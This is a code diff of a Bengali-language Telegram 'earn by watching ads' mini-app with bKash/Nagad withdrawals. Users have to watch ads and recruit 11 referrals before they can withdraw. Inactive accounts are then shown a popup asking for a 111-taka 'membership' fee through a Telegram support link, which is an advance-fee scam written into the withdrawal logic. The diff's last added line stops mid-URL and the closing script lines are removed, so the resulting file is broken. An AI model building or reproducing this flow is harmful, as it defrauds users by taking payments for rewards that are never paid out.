@@ -112,7 +112,6 @@ body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; ma
         <h3>💳 রিডিম (Redeem)</h3>
         <p style="font-weight:bold; color:#475569;">ইউজার আইডি: <span id="display-user-id"></span></p>
         <p>আপনার ব্যালেন্স: <b style="color: #2563eb;"><span id="wallet-balance">0</span> কয়েন</b></p>
-        <p style="font-size: 13px; color: #ef4444; font-weight: bold;">নোট: ৫০০ কয়েন = ১০ টাকা, ১০০০ কয়েন = ২০ টাকা।</p>
         <label align="left" style="display:block; font-weight:bold; font-size: 14px;">পেমেন্ট মেথড:</label>
         <select class="input-field" id="payment-method"><option value="bkash">বিকাশ (bKash)</option><option value="nagad">নগদ (Nagad)</option></select>
         <input type="number" class="input-field" id="withdraw-number" placeholder="আপনার বিকাশ/নগদ নাম্বার লিখুন">
@@ -223,10 +222,7 @@ function startTimer() {
 
 async function watchRealAd() {
     await checkAndResetDailyLimit();
-    if(totalWatched >= 50) { 
-        tg.showAlert("আজকের লিমিট শেষ! আগামীকাল আবার নতুন ভিডিও দেখার সুযোগ পাবেন। ⏳"); 
-        return; 
-    }
+    if(totalWatched >= 50) { tg.showAlert("আজকের লিমিট শেষ! আগামীকাল আবার নতুন ভিডিও দেখার সুযোগ পাবেন। ⏳"); return; }
     if (typeof show_11149595 === 'function') {
         show_11149595().then(async () => {
             userBalance += 20; totalTasks++; totalWatched++;
@@ -241,33 +237,45 @@ async function processWithdraw() {
     const number = document.getElementById("withdraw-number").value;
     const method = document.getElementById("payment-method").value;
     const supportLink = "https://t.me/ks162699bot"; 
+    
     const payoutAmount = amount / 50; 
     
     if (!number || !amount) { tg.showAlert("সব তথ্য পূরণ করুন।"); return; }
     if (amount < 500) { tg.showAlert("ন্যূনতম ৫০০ কয়েন প্রয়োজন!"); return; }
     if (amount > userBalance) { tg.showAlert("পর্যাপ্ত ব্যালেন্স নেই!"); return; }
+    
     if (totalRefers < 11) { tg.showAlert("⚠️ রিডিম করতে ১১টি রেফার প্রয়োজন। বর্তমান রেফার: " + totalRefers + "টি।"); return; }
     
     if (isActive === true) {
-        await db.collection('withdraw_requests').add({
-            userId: userId, number: number, amount: amount, payout: payoutAmount, method: method, status: "pending", time: new Date()
+        tg.showPopup({
+            title: 'পেমেন্ট কনফার্মেশন',
+            message: `আপনি ${amount} কয়েন উত্তোলন করতে চাচ্ছেন।\n\nহিসাব:\n৫০০ কয়েন = ১০ টাকা\n১০০০ কয়েন = ২০ টাকা\n\nআপনার প্রাপ্ত টাকা: ${payoutAmount} টাকা।\n\nআপনি কি নিশ্চিত?`,
+            buttons: [
+                {id: 'confirm', type: 'default', text: 'হ্যাঁ, পাঠান'}, 
+                {type: 'cancel', text: 'না'}
+            ]
+        }, async (buttonId) => { 
+            if (buttonId === 'confirm') {
+                await db.collection('withdraw_requests').add({
+                    userId: userId, number: number, amount: amount, payout: payoutAmount, method: method, status: "pending", time: new Date()
+                });
+                userBalance -= amount;
+                await saveAllData(); updateUI(); loadPaymentHistory();
+                tg.showAlert("🎉 সফল! আপনার পেমেন্ট রিকোয়েস্ট জমা হয়েছে।");
+            }
         });
-        userBalance -= amount;
-        await saveAllData(); updateUI(); loadPaymentHistory();
-        tg.showAlert("🎉 সফল! আপনার " + payoutAmount + " টাকা ( " + amount + " কয়েন) পেমেন্ট রিকোয়েস্ট জমা হয়েছে।");
-        return;
+    } else {
+        tg.showPopup({
+            title: '🎉 আপনার অ্যাকাউন্টটি ভেরিফাই করুন!',
+            message: 'অভিনন্দন! আপনার ১১টি রেফার সফল হয়েছে। এখন শুধু আপনার অ্যাকাউন্টটি অ্যাক্টিভ করার পালা।\n\nঅ্যাকাউন্ট অ্যাক্টিভ করতে মাত্র ১১১ টাকা দিয়ে মেম্বারশিপ নিন।\n\nঅ্যাক্টিভ করতে নিচের লিংকে যোগাযোগ করুন:',
+            buttons: [
+                {id: 'support', type: 'default', text: 'অ্যাক্টিভ করতে এখানে ক্লিক করুন'}, 
+                {type: 'cancel', text: 'পরে করব'}
+            ]
+        }, (buttonId) => { 
+            if (buttonId === 'support') { tg.openTelegramLink(supportLink); } 
+        });
     }
-    
-    tg.showPopup({
-        title: '🎉 আপনার অ্যাকাউন্টটি ভেরিফাই করুন!',
-        message: 'অভিনন্দন! আপনার ১১টি রেফার সফল হয়েছে। এখন শুধু আপনার অ্যাকাউন্টটি অ্যাক্টিভ করার পালা।\n\nকেন অ্যাকাউন্ট অ্যাক্টিভ করবেন?\n🔹 লাইফটাইম পেমেন্ট গ্যারান্টি (১০০% নিরাপদ)।\n🔹 যেকোনো সময় আনলিমিটেড উইথড্র করার সুবিধা।\n🔹 প্রিমিয়াম ইউজার হিসেবে ফাস্ট পেমেন্ট সাপোর্ট।\n\nবিনিময়ে মাত্র ১১১ টাকা দিয়ে আজই মেম্বারশিপ নিন এবং নিয়মিত আয় করুন।\n\nঅ্যাক্টিভ করতে নিচের লিংকে যোগাযোগ করুন:',
-        buttons: [
-            {id: 'support', type: 'default', text: 'অ্যাক্টিভ করতে এখানে ক্লিক করুন'}, 
-            {type: 'cancel', text: 'পরে করব'}
-        ]
-    }, (buttonId) => { 
-        if (buttonId === 'support') { tg.openTelegramLink(supportLink); } 
-    });
 }
 
 function loadReferralsList() {
@@ -305,9 +313,4 @@ function switchPage(id, el) {
     el.classList.add('active');
 }
 function copyRefer() { navigator.clipboard.writeText("https://t.me/TakaInkam1626_bot?start=" + userId); tg.showAlert("লিংক কপি হয়েছে!"); }
-function shareRefer() { tg.openTelegramLink("https://t.me/share/url?url=" + encodeURIComponent("https://t.me/TakaInkam1626_bot?start=" + userId)); }
-function claimChannelBonus(id, url) { window.open(url, '_blank'); }
-window.onload = loadAllData;
-</script>
-</body>
-</html>
+function shareRefer() { tg.openTelegramLink("https://t.me/share/u
